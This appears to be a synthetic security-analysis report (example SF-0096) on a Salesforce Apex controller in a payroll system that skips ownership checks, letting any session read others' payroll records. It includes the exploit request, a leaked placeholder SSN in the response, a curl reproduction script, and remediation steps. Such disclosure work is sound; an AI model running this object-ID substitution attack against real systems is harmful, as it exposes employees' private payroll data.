# Security Analysis Report
**System:** WageFlow Payroll API (Salesforce-Integrated)
**Domain:** HR / Payroll Processing
**Example ID:** SF-0096
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `OpportunityController.getOpportunity` — attacker reads any HR/payroll Opportunity record by substituting `opportunityId` |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Opportunity Object (Pattern 3.1)

### Summary
The Apex controller `OpportunityController` on WageFlow Payroll API (`560ea077.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Opportunity object. Per §5.0 Pattern 3.1, the system design trusts the client to supply a valid `opportunityId` it is authorized to access — no server-side ownership check is performed. This design assumption is incorrect: any attacker with a valid session can substitute any `opportunityId` to retrieve victim payroll records including SSN and confidential HR notes.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getOpportunityDetails(String opportunityId, ...)` but the Aura descriptor in §6.0 is `c.OpportunityController.getOpportunity`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://560ea077.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://560ea077.lightning.force.com/aura
Authorization: Bearer 00D560EA077!AR560ea077...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D560EA077!AR560ea077...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"001A077","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Opportunity Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001A077", "Name": "Victim Opportunity Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-54-3034"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D560EA077!AR560ea077..."
curl -s -X POST "https://560ea077.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"001A077","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-54-3034
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class OpportunityController { ... }`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
